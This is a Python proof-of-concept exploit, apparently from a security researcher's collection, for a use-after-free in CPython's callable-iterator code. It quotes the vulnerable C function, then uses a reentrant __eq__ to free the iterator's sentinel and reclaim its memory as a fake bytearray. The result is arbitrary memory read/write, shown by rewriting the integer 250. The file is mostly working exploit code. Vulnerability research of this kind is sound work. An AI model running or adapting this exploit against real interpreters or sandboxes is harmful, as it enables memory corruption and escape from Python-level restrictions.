"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: UAF on a controlled object to create evil object
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/iterobject.c#L223-L254
"""
static PyObject *
calliter_iternext(PyObject *op)
{
    calliterobject *it = (calliterobject*)op;
    PyObject *result;

    if (it->it_callable == NULL) {
        return NULL;
    }

    result = _PyObject_CallNoArgs(it->it_callable);
    if (result != NULL && it->it_sentinel != NULL){
        int ok;

        ok = PyObject_RichCompareBool(it->it_sentinel, result, Py_EQ); // <--- calls __eq__ without incrementing
                                                                       //      the refcount for it->it_sentinel
        if (ok == 0) {
            return result; /* Common case, fast path */
        }

        if (ok > 0) {
            Py_CLEAR(it->it_callable);
            Py_CLEAR(it->it_sentinel); // <--- taking this path can clear it->it_sentinel
        }
    }
    else if (PyErr_ExceptionMatches(PyExc_StopIteration)) {
        PyErr_Clear();
        Py_CLEAR(it->it_callable);
        Py_CLEAR(it->it_sentinel); // <--- taking this path can clear it->it_sentinel
    }
    Py_XDECREF(result);
    return NULL;
}
"""

# The plan of attack with this one is to create an evil obj with an evil __eq__ function that reenters the function,
# and raises StopIteration which clears it->it_sentinel. Once it's cleared, we return to our python function and return NotImplemented
# so that it'll pass it to `catch.__eq__` which will receive the freed object (it->it_sentinel) as the `other` arg.

from common import evil_bytearray_obj

class catch:
    def __eq__(self, other):
        global mem
        mem = other
        return False

class evil(bytes):
    lock = False

    def __eq__(self, other):
        global _ref
        if evil.lock:
            return True

        # raises StopIteration but we're still not done so ignore it
        evil.lock = True
        try:
            next(it)
        except StopIteration:
            pass
        evil.lock = False

        # After reentering, we cleared it->it_sentinel which means the only ref left
        # is `self`, so we can delete that too to drop the refcnt to 0 and free the object
        del self

        # reclaim the memory we just freed with data for an evil bytearray
        _ref = fake_obj.ljust(SIZE, b"\0")

        # freed object (now our fake obj) will be received in catch.__eq__
        return NotImplemented

# see ./common/common.py for evil bytearray obj explanation
fake_obj, _ = evil_bytearray_obj()

SIZE = 0x100
it = iter(lambda: catch(), evil(SIZE - 0x18))

mem = None
next(it)
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100